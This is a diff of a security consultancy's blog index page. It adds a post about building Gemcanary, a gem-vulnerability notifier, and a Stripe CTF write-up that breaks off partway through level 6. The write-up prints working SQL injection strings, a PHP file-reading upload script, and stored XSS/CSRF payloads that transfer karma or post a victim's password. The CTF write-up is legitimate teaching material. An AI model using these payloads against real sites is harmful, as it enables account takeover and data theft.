@@ -6,11 +6,10 @@
 <head>
   <meta charset="utf-8">
   <title>Finite State</title>
-  <meta name="author" content="State Machienry">
+  <meta name="author" content="State Machinery">
 
   
-  <meta name="description" content="Letterpress is an iOS game
-that came out a few weeks ago and immediately became popular enough to take down Apple&#8217;s GameCenter. It&#8217;s a &hellip;">
+  <meta name="description" content="Here at State Machinery we&#8217;re big fans of lolcommits and we set it up on every project we work on. Gemcanary was no different: Scratching an &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +65,71 @@ that came out a few weeks ago and immediately became popular enough to take down
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/03/08/making-gemcanary/">What an MVP Looks Like: Making Gemcanary</a></h1>
+    
+    
+      <p class="meta">
+        
+  
+
+<span class="byline author vcard"><span class="fn"><a href="http://twitter.com/phillmv">Phillip Mendonça-Vieira</a></span></span>
+
+        
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2013-03-08T00:40:00-05:00" pubdate data-updated="true">Mar 8<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Here at <a href="http://state.io">State Machinery</a> we&#8217;re big fans of <a href="https://github.com/mroth/lolcommits">lolcommits</a> and we set it up on every project we work on. <a href="https://gemcanary.com">Gemcanary</a> was no different:</p>
+
+<iframe width="480" height="360" src="http://www.youtube.com/embed/R7pgAlCB3kU?rel=0" frameborder="0" allowfullscreen></iframe>
+
+
+<h2>Scratching an itch</h2>
+
+<p>The Ruby community was recently besieged by a series of devastating security vulnerabilities. These things happen. It&#8217;s hard to get everything right all the time and, if anything, for an ecosystem everyone loves to hate it&#8217;s a little surprising it took this long for something this serious to emerge.</p>
+
+<p>We sighed and scrambled to update our apps in production.</p>
+
+<p>However, a couple of weeks later while debugging my personal server, I noticed that I had left a couple of toy apps unattended. I had totally forgotten about them, on account of the fact that I hadn&#8217;t touched them in well over a year. No one had visited these urls in forever and nothing important was stored on that machine, but we wiped the server as part of our standard operating procedure.</p>
+
+<p>After spending a couple of hours putting everything that wasn&#8217;t in a chef script back together, I felt really annoyed. The whole security process as we experience it <em>sucks</em>.</p>
+
+<p>It&#8217;s actually really hard to keep up to date with every single piece of ruby-related news. If you work on a small team, depending on your social network to communicate critical patches totally falls apart if you ever plan on spending time away from the computer. And once you&#8217;ve been a web developer for a few years you end up collecting a lot of apps, repositories and deployments you&#8217;re responsible for.</p>
+
+<p>So, we decided to automate it.</p>
+
+<p><a href="https://gemcanary.com">Gemcanary</a> will read your Gemfile.lock and notify you if any of your app&#8217;s dependencies become vulnerable.</p>
+
+<p>Given that we&#8217;re a new consultancy, we found ourselves with some time between client projects and just went full blast for two weeks. It was a lot of fun to work on. Although not every itch is worth investing this much time into, building an app you intend strangers to depend on is a very humbling and educational experience.</p>
+
+<p>There&#8217;s a more lot to be said about building apps on Github&#8217;s API, scratching itches and fixing the Ruby security process &mdash; which, through <a href="http://rubysec.github.com">Rubysec</a> we&#8217;re trying to be a part of &mdash; and this is something we&#8217;ll be exploring more of over the next few weeks.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -366,6 +430,855 @@ hook will persist even if the user destroys the VM.</p>
 
     </article>
   
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/08/30/my-solutions-to-the-stripe-ctf-web-app-edition/">My Solutions to the Stripe CTF (Web App Edition)</a></h1>
+    
+    
+      <p class="meta">
+        
+  
+
+<span class="byline author vcard"><span class="fn"><a href="http://twitter.com/mveytsman">Max Veytsman</a></span></span>
+
+        
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2012-08-30T17:55:00-04:00" pubdate data-updated="true">Aug 30<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Stripe recently ran a <a href="https://stripe-ctf.com">CTF</a> focused on web application hacking.  It ended yesterday, and I decided to write up my solutions.  If you have any questions or find a bug in my solutions, you can reach me at <strong>max [at] state.io</strong>.</p>
+
+<p>First of all, I had an great time solving these challenges.  Big thanks to the Stripe team for creating such a fun game. I hope to see more CTFs from them in the future.</p>
+
+<p>Now, onto the challenges!</p>
+
+<h2>Level 0</h2>
+
+<p>The zeroth level was a pretty basic SQL injection that served as an introduction to the game mechanics and what&#8217;s expected from the player.  That 7000 participants number comes from the number of people who completed level 0 and officially entered the competition.</p>
+
+<p>The Secret Safe is a web page that allows you to store secrets by specifying a namespace, a name, and a secret.  Secrets are queried by namespace, and somewhere in the secret database is the password for the next level.  Each secret is stored with a key of <code>NAMESPACE.TITLE</code>, and when you query the database for a given namespace you are getting back all of the keys in that namespace.  Of course you can try guessing the namespace that the password is stored in, or&#8230;</p>
+
+<p>The relevant lines are:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM secrets WHERE key LIKE ? || &quot;.%&quot;&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">query</span><span class="p">,</span> <span class="nx">namespace</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">secrets</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>By querying the site for secrets in the namespace of <code>%</code>, you cause the SQL query that is executed to evaluate to <code>SELECT * FROM secrets WHERE key LIKE %.%</code> which of course will spit out every secret stored in every namespace, including the password.</p>
+
+<p><img src="/assets/images/stripe-ctf/level0-solved.png" alt="Level 0 Solved" /></p>
+
+<h2>Level 1</h2>
+
+<p>Level 1 is a &#8220;guessing game.&#8221;  You&#8217;re asked to guess a secret combination, and given the next level&#8217;s password if your guess is correct.  The code is below:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;secret-combination.txt&#39;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$attempt</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nv">$combination</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$attempt</span> <span class="o">===</span> <span class="nv">$combination</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;How did you know the secret combination was&quot;</span> <span class="o">.</span>
+</span><span class='line'>           <span class="s2">&quot; </span><span class="si">$combination</span><span class="s2">!?&lt;/p&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$next</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;level02-password.txt&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;You&#39;ve earned the password to the access Level 2:&quot;</span> <span class="o">.</span>
+</span><span class='line'>           <span class="s2">&quot; </span><span class="si">$next</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Incorrect! The secret combination is not </span><span class="si">$attempt</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The problem is <code>extract($_GET)</code> on line 3.  <code>extract</code> will take a hash and load all of its values into the symbol table.  Running this on <code>$_GET</code> is dangerous for obvious reasons, and the PHP <a href="http://php.net/manual/en/function.extract.php">manual</a> does warn loudly about this.  If we supply <code>filename</code> as one of the GET parameters, Iwecan redefine the <code>$filename</code> variable.  Now all we have to do is supply a filename of a file whose contents we know, and submit those contents as our guess.</p>
+
+<p>There are a lot of ways to do this, but I found it most natural to choose a filename that doesn&#8217;t exist, and supply an empty string as my guess.  Because the script doesn&#8217;t really deal with errors, this will result in a correct attempt.  My final querystring was <code>attempt=&amp;filename=DOESNOTEXIT</code></p>
+
+<p><img src="/assets/images/stripe-ctf/level1-solved.png" alt="Level 1 Solved" /></p>
+
+<h2>Level 2</h2>
+
+<p>Level 2 presents you with a &#8220;social network,&#8221; where you have the opportunity to upload your avatar image.  The password for the next level is stored in a text file on the server.  As it turns out, you can upload any kind of file you want, not just images.  And this includes PHP files, which the server will happily execute when you navigate to the URL of the uploaded script.  You can even get a handy directory listing:</p>
+
+<p><img src="/assets/images/stripe-ctf/level2-directory_listing.png" alt="Level 2 Directory Listing" /></p>
+
+<p>Above you can see a bunch of files that I uploaded, and even a false attempt at the challenge.  Having a place to dump scripts and other files is going to come in handy for the later challenges.</p>
+
+<p>To solve this level, all we have to do is upload a file with a PHP script that echoed the password and navigate to it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;../password.txt&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="k">echo</span> <span class="nv">$password</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 3</h2>
+
+<p>Level 3 is a more secure implementation of the Secret Safe from level 0, and is once again solved by SQL injection.  In level 3, the secrets are segregated by user, and to view a secret you have to log in with a password.  Passwords are stored salted and hashed.</p>
+
+<p>The relevant lines are</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">query</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;SELECT id, password_hash, salt FROM users</span>
+</span><span class='line'><span class="s">           WHERE username = &#39;{0}&#39; LIMIT 1&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span><span class='line'><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">return</span> <span class="s">&quot;There&#39;s no such user {0}!</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span><span class='line'><span class="n">user_id</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">salt</span> <span class="o">=</span> <span class="n">res</span>
+</span><span class='line'><span class="n">calculated_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">salt</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="n">calculated_hash</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">!=</span> <span class="n">password_hash</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">return</span> <span class="s">&quot;That&#39;s not the password for {0}!</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span><span class='line'><span class="n">flask</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="s">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_id</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To log in as our target user, we need the <code>password_hash</code> from the database to match our supplied password salted and hashed.</p>
+
+<p>Using a SQL injection, we can cause the query to return our precomputed values as the <code>password_hash</code> of a given user.  When we try to log in with the username <code>a' UNION SELECT ID, HASH, SALT;--</code>, the SQL query becomes <code>SELECT id, password_hash, salt FROM users WHERE username = 'a' UNION SELECT ID, HASH, SALT</code></p>
+
+<p>Since there is no user &#8216;a&#8217;, the above will return one row, which contains the id, password hash, and salt that we supply.  We pick an arbitrary password and salt, compute the hash, and use that to be able to log in as any user.  Logging in as user 3 will give the password to the next level (the other users contain the solution to P=NP and the like).</p>
+
+<h2>Level 4</h2>
+
+<p>Level 4 is a karma trading game.  You register as a user, and then can transfer karma to other users in the game.  To keep things honest, if a user transfers you karma, you also get to see their password.</p>
+
+<p><img src="/assets/images/stripe-ctf/level4.png" alt="Level 4" /></p>
+
+<p>The user karma_fountain&#8217;s password is the password to the next level, so if karma_fountain gives you karma, you also get the password to the next level.</p>
+
+<p>We have to force karma_fountain to transfer us some karma.  Inducing a user on a social site to take some action is usually a job for XSS + CSRF, we have to inject some javascript that karma_trader&#8217;s browser will execute that will send a request to transfer us some karma.  By the way, I am very impressed at the Stripe team for automating the process they used to grade the XSS challenges.  Greg Brockman has a blog <a href="https://blog.gregbrockman.com/2012/08/system-design-stripe-capture-the-flag/">post</a> that addresses how they did this along with some other insights into building a CTF at this scale.</p>
+
+<p>The only user supplied value that other users can see is our password after we give them karma, so we have to inject into that.  Registering a user with the username &#8216;attacker&#8217; and the password <code>&lt;script&gt;$.post("transfer", {"to" : "attacker", "amount":10})&lt;/script&gt;</code> will cause any user we give karma to see our password, have their browser execute the javascript within it, and transfer us some karma too.</p>
+
+<p>Transferring karma to karma_trader from attacker completes the challenge:</p>
+
+<p><img src="/assets/images/stripe-ctf/level4-solved.png" alt="Level 4 Solved" /></p>
+
+<h2>Level 5</h2>
+
+<p>Level 5 is DomainAuthenticator, a federated login service.  You supply a username, password, and pingback URL.  If the pingback URL returns &#8216;AUTHENTICATED&#8217; when supplied with your credentials, you are authenticated for the domain of the pingback URL. If you can get authenticated for the level 5 domain, you can go on to the next challenge.</p>
+
+<p>The two things to notice in the code are how the user input is handled on POST requests:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">post</span> <span class="s1">&#39;/*&#39;</span> <span class="k">do</span>
+</span><span class='line'>  <span class="n">pingback</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="ss">:pingback</span><span class="o">]</span>
+</span><span class='line'>  <span class="n">username</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="ss">:username</span><span class="o">]</span>
+</span><span class='line'>  <span class="n">password</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="ss">:password</span><span class="o">]</span>
+</span><span class='line'>  <span class="c1"># ...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and how authentication is validated</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">authenticated?</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">body</span> <span class="o">=~</span> <span class="sr">/[^\w]AUTHENTICATED[^\w]*$/</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first obvious move is to get authenticated somewhere.  The DomainAuthenticator server is limited to making outbound network requests only to other stripe servers, but luckily we can make arbitrary uploads to another stripe CTF server &#8212; level 2.  Simply uploading a file that contains the string &#8220;AUTHENTICATED&#8221; to the level 2 upload field and using that as a pingback URL will allow us to authenticate with the level 2 domain with any username/password.</p>
+
+<p>After authenticating, stripe responds with: &#8220;Remote server responded with: AUTHENTICATED. Authenticated as user@level02-2.stripe-ctf.com!&#8221;  That got us in as a user of level02-2.stripe-ctf.com, but we want to be logged in as a user of level05-2.stripe-ctf.com.  The key observation here is that the regular expression used in <code>authenticated</code> matches per line, so we only need one of the lines of the response body to match.  If we make sure that the file we uploaded to level2 contains a new line after AUTHENTICATED, the response after authentication will be &#8220;Remote server responded with: AUTHENTICATED\n. Authenticated as user@level02-2.stripe-ctf.com!&#8221;, which will match that regular expression.  Since that response is coming from level05-2.stripe-ctf.com, that&#8217;s enough to get us in.</p>
+
+<p>The <code>params</code> variable in Sinatra contains both POSTed data and values in the query string, so we can specify a pingback in the URL and it will still be picked up in a POST request.  I uploaded a file that contains the string &#8220;AUTHENTICATED\n&#8221; to level 2 at the URL <code>https://level02-2.stripe-ctf.com/user-iinxtuvzks/uploads/auth</code>, and then my pingback URL was  <code>https://level05-2.stripe-ctf.com/user-rpyvuiltkk/?pingback=https://level02-2.stripe-ctf.com/user-iinxtuvzks/uploads/auth</code>.  This causes the body of a response on the level-5-2.stripe-ctf.com domain to match the regex in <code>authenticated?</code>, and I am authenticated on the level 5 domain.</p>
+
+<p>As a sidenote, after solving this challenge the first time, when I came back to gather screenshots, I found that I could authenticate to the level 5 domain, but was no longer shown the password:</p>
+
+<p><img src="/assets/images/stripe-ctf/level5-solved.png" alt="Level 5 Solved?" /></p>
+
+<p>If anyone knows why I didn&#8217;t see a password the second time around, please tell me!</p>
+
+<h2>Level 6</h2>
+
+<p>Level 6 is a follow-up to Karma Trader from level 4.  You are able to sign up for Streamer, a Twitter-like service, and post messages.  The target user is &#8216;level07-password-holder&#8217; whose password is the password for the next level.</p>
+
+<p>The target user&#8217;s first post gives a hint about what to do:</p>
+
+<blockquote><p>One great feature of Streamer is that no password resets are needed. I, for
+example, have a very complicated password (including apostrophes, quotes, you
+name it!). But I remember it by clicking my name on the right-hand side and
+seeing what my password is.</p></blockquote>
+
+<p>That is, a user may view their own password in the user info page:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&#39;row&#39;</span><span class="nt">&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&#39;span12&#39;</span><span class="nt">&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;h3&gt;</span>User Information<span class="nt">&lt;/h3&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">&#39;table table-condensed&#39;</span><span class="nt">&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;tr&gt;</span>
+</span><span class='line'>        <span class="nt">&lt;th&gt;</span>Username:<span class="nt">&lt;/th&gt;</span>
+</span><span class='line'>        <span class="nt">&lt;td&gt;</span><span class="err">&lt;</span>%= @username %&gt;<span class="nt">&lt;/td&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;/tr&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;tr&gt;</span>
+</span><span class='line'>        <span class="nt">&lt;th&gt;</span>Password:<span class="nt">&lt;/th&gt;</span>
+</span><span class='line'>        <span class="nt">&lt;td&gt;</span><span class="err">&lt;</span>%= @password %&gt;<span class="nt">&lt;/td&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;/tr&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;/table&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
+</span><span class='line'><span class="nt">&lt;/div&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once again, we need to use XSS+CSRF to cause the target user to reveal their password.  In this case we will post a message that contains an XSS vector that causes the viewer to get their password from the user info page and post it as a message.</p>
+
+<p>The injection vector should cause the victim to grab the password from the user info page and post a message.  It will look something like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;user_info&#39;</span><span class="p">,</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;ajax/posts&#39;</span><span class="p">,</span>
+</span><span class='line'>    <span class="p">{</span> <span class="nx">title</span><span class="o">:</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;td&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">innerHTML</span><span class="p">,</span>
+</span><span class='line'>      <span class="nx">body</span><span class="o">:</span> <span class="s1">&#39;EMPTY&#39;</span>
+</span><span class='line'>    <span class="p">});</span>
+</span><span class='line'><span class="p">});</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The second <code>&lt;td&gt;</code> tag we select above is the one that contains the user&#8217;s password in the user info page.</p>
+
+<p>Where are we going to inject into?  The ERB template used to display the messages loads all the posts in JSON format as an object inside a script tag.  The contents of that object are then added to the DOM using javascript.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="s2">&quot;&lt;%= @username %&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">post_data</span> <span class="o">=</span> <span class="o">&lt;%=</span> <span class="err">@</span><span class="nx">posts</span><span class="p">.</span><span class="nx">to_json</span> <span class="o">%&gt;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="kd">function</span> <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">return</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;&lt;div/&gt;&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">val</span><span class="p">).</span><span class="nx">html</span><span class="p">();</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="kd">function</span> <span class="nx">addPost</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">var</span> <span class="nx">new_element</span> <span class="o">=</span> <span class="s1">&#39;&lt;tr&gt;&lt;th&gt;&#39;</span> <span class="o">+</span> <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">item</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])</span> <span class="o">+</span>
+</span><span class='line'>                      <span class="s1">&#39;&lt;/th&gt;&lt;td&gt;&lt;h4&gt;&#39;</span> <span class="o">+</span> <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">item</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;&lt;/h4&gt;&#39;</span> <span class="o">+</span>
+</span><span class='line'>                      <span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">item</span><span class="p">[</span><span class="s1">&#39;body&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#posts &gt; tbody:last&#39;</span><span class="p">).</span><span class="nx">prepend</span><span class="p">(</span><span class="nx">new_element</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">post_data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">var</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">post_data</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+</span><span class='line'>    <span class="nx">addPost</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">};</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is where our injection will happen.  We will post a message that contains a closing and then opening script tag. So if we post a message with the body <code>&lt;/script&gt;&lt;script&gt;$.get('user_info',function (data) {$.post('ajax/posts', {title:$('td', data)[1].innerHTML, body:'EMPTY'})});&lt;/script&gt;&lt;script&gt;</code> we get something like</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="s2">&quot;USERNAME&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">post_data</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&quot;id&quot;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;title&quot;</span><span class="o">:</span> <span class="s2">&quot;Some title&quot;</span><span class="p">,</span> <span class="s2">&quot;body&quot;</span><span class="o">:</span> <span class="err">&quot;</span><span class="nt">&lt;/script&gt;&lt;script&gt;</span><span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;user_info&#39;</span><span class="p">,</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span><span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;ajax/posts&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;td&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">innerHTML</span><span class="p">,</span> <span class="nx">body</span><span class="o">:</span><span class="s1">&#39;EMPTY&#39;</span><span class="p">})});</span><span 